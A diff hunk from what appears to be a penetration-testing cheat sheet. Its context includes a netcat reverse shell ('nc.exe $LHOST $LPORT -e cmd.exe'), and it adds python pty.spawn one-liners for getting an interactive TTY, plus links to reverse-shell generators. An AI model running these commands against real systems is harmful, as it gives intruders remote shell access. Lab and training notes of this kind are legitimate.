@@ -23,6 +23,8 @@ nc.exe $LHOST $LPORT -e cmd.exe
 ```
 Afterwards, stabilize with [this](https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal)
 
+Gain TTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'` or `python3 -c 'import pty; pty.spawn("/bin/sh")'`
+
 ## Revshells
 
 [revshells.com](https://www.revshells.com/)
